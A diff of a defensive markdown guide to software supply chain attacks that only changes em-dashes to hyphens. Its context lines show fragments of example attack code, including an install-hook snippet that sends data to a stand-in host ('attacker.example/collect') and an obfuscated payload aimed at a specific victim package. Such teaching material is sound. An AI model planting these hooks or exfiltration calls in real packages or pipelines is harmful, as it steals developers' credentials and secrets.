@@ -7,7 +7,7 @@
 
 ## The Core Attack Flow
 
-Every supply chain attack follows the same underlying logic: **compromise something upstream that the victim already trusts, so the malicious code is delivered through a channel the victim will not question.** The attacker does not need to breach your perimeter—they let your own build and update mechanisms carry the payload in for them.
+Every supply chain attack follows the same underlying logic: **compromise something upstream that the victim already trusts, so the malicious code is delivered through a channel the victim will not question.** The attacker does not need to breach your perimeter-they let your own build and update mechanisms carry the payload in for them.
 
 ```
 1. FIND a trusted upstream       (a dependency, maintainer, build step,
@@ -28,7 +28,7 @@ The patterns below are concrete instances of that flow, grouped roughly from the
 
 ### 1. Exploiting Known-Vulnerable / Outdated Dependencies
 
-The classic A06:2021 case: the attacker does not tamper with anything—they simply scan for applications still running a component with a published vulnerability and exploit it. Version banners, error pages, and public SBOMs make target selection easy.
+The classic A06:2021 case: the attacker does not tamper with anything-they simply scan for applications still running a component with a published vulnerability and exploit it. Version banners, error pages, and public SBOMs make target selection easy.
 
 ```
 # Attacker fingerprints a known-vulnerable version, then fires a public exploit
@@ -74,7 +74,7 @@ The attacker publishes a package to the *public* registry using the *same name* 
 
 ### 4. Malicious Install / Lifecycle Hooks
 
-Package managers run scripts at install time. A malicious package uses these hooks to execute the moment it is installed—on a developer laptop or a CI runner—before any of its code is ever imported.
+Package managers run scripts at install time. A malicious package uses these hooks to execute the moment it is installed-on a developer laptop or a CI runner-before any of its code is ever imported.
 
 ```json
 // package.json of a malicious dependency
@@ -100,7 +100,7 @@ https.request('https://attacker.example/collect',
 
 ### 5. Compromised Maintainer Account / Hijacked Package
 
-Instead of creating a new malicious package, the attacker seizes an existing trusted one—via credential stuffing, a phished one-time code, or a maintainer's expired email domain that they re-register—then ships a malicious release under a name millions already depend on.
+Instead of creating a new malicious package, the attacker seizes an existing trusted one-via credential stuffing, a phished one-time code, or a maintainer's expired email domain that they re-register-then ships a malicious release under a name millions already depend on.
 
 ```
 Timeline of a hijack:
@@ -129,7 +129,7 @@ your-app          (audited)
 
 ### 7. Build System / CI/CD Pipeline Compromise
 
-Rather than the code, the attacker compromises the *factory*. A malicious or altered build step injects the payload during compilation—after code review, before signing—so the output is malicious yet validly signed. This is the SolarWinds class.
+Rather than the code, the attacker compromises the *factory*. A malicious or altered build step injects the payload during compilation-after code review, before signing-so the output is malicious yet validly signed. This is the SolarWinds class.
 
 ```yaml
 # A malicious step slipped into the pipeline (or into a compromised runner)
@@ -144,7 +144,7 @@ build:
 
 ### 8. Leaked Pipeline Secrets / Poisoned Runners
 
-CI runners hold cloud keys, registry tokens, and signing material in environment variables. Any code that runs in the pipeline—a dependency's install hook, a third-party action, a compromised uploader—can read and exfiltrate them. Self-hosted runners reused across jobs can be poisoned to persist between builds.
+CI runners hold cloud keys, registry tokens, and signing material in environment variables. Any code that runs in the pipeline-a dependency's install hook, a third-party action, a compromised uploader-can read and exfiltrate them. Self-hosted runners reused across jobs can be poisoned to persist between builds.
 
 ```
 # Anything running in CI can read the secrets the job was granted
@@ -170,7 +170,7 @@ $ tar xzf tool.tar.gz && ./install.sh              # runs whatever arrived
 
 ### 10. Poisoned Container Base Images
 
-Images built `FROM` a mutable tag inherit whatever that tag points to today. An attacker who compromises a base image—or a look-alike published under a confusing name—lands code in every downstream image, running as whatever user the container uses.
+Images built `FROM` a mutable tag inherit whatever that tag points to today. An attacker who compromises a base image-or a look-alike published under a confusing name-lands code in every downstream image, running as whatever user the container uses.
 
 ```dockerfile
 # Mutable tag: the contents can change between builds without warning
@@ -182,7 +182,7 @@ FROM node:latest          # today != tomorrow; no digest pinning
 
 ### 11. Compromised Third-Party Scripts / CDNs (Web-Skimming)
 
-On the web tier, pages load scripts directly from third-party origins (analytics, tag managers, payment and chat widgets). If that origin is compromised, the injected code runs inside your page with full access to the DOM—this is the Magecart pattern that harvests payment cards at checkout.
+On the web tier, pages load scripts directly from third-party origins (analytics, tag managers, payment and chat widgets). If that origin is compromised, the injected code runs inside your page with full access to the DOM-this is the Magecart pattern that harvests payment cards at checkout.
 
 ```html
 <!-- No integrity check: whatever this URL returns today executes in your page -->
@@ -210,7 +210,7 @@ resolved "https://registry.example/left-utils/-/left-utils-1.0.0.tgz"
 
 ### 13. Malicious Insider / Protestware
 
-A maintainer—original or newly handed the keys—deliberately introduces sabotage or a narrowly targeted payload, sometimes triggered only for specific downstream victims or geographies (the event-stream class). Obfuscation keeps it out of casual review.
+A maintainer-original or newly handed the keys-deliberately introduces sabotage or a narrowly targeted payload, sometimes triggered only for specific downstream victims or geographies (the event-stream class). Obfuscation keeps it out of casual review.
 
 ```js
 // Obfuscated payload that only activates for a specific downstream target
@@ -223,7 +223,7 @@ if (process.env.npm_package_name === 'specific-victim-app') {
 
 ### 14. Long-Game Social-Engineering Backdoor
 
-The most patient variant (the xz-utils class): an attacker contributes helpfully to a low-profile but critical project for months, earns maintainer trust, then plants a backdoor hidden in *release artifacts* and build scripts rather than the readable source—so the git repository looks clean while shipped tarballs are backdoored.
+The most patient variant (the xz-utils class): an attacker contributes helpfully to a low-profile but critical project for months, earns maintainer trust, then plants a backdoor hidden in *release artifacts* and build scripts rather than the readable source-so the git repository looks clean while shipped tarballs are backdoored.
 
 ```
 # The backdoor lives in the packaged tarball / build machinery, not the repo:
